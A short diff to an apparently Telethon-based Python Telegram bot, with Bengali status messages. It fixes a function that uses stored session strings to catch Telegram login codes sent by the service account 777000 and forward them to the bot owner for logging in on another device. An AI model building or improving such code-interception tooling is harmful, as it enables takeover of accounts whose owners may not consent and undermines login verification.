@@ -66,13 +66,16 @@ async def get_otp_for_number(phone, session_string, bot_app):
 
         await bot_app.bot.send_message(
             OWNER_ID,
-            f"👂 `{phone}` নম্বর listen করছে...\n⏳ এখন অন্য device থেকে login করুন, OTP আসলে এখানে পাঠাবো।",
+            f"👂 `{phone}` নম্বর listen করছে...\n\n"
+            f"⚠️ অন্য device থেকে login করার সময়\n"
+            f"*'Send via Telegram app'* বেছে নিন!\n\n"
+            f"⏳ ১২০ সেকেন্ড অপেক্ষা করছি...",
             parse_mode="Markdown"
         )
 
         otp_received = False
 
-        @client.on(events.NewMessage(from_users=42777))
+        @client.on(events.NewMessage(from_users=777000))
         async def otp_handler(event):
             nonlocal otp_received
             otp_received = True
@@ -95,7 +98,7 @@ async def get_otp_for_number(phone, session_string, bot_app):
         if not otp_received:
             await bot_app.bot.send_message(
                 OWNER_ID,
-                f"⏰ `{phone}` এর OTP timeout হয়েছে!",
+                f"⏰ `{phone}` এর OTP timeout হয়েছে!\n আবার চেষ্টা করুন।",
                 parse_mode="Markdown"
             )
 
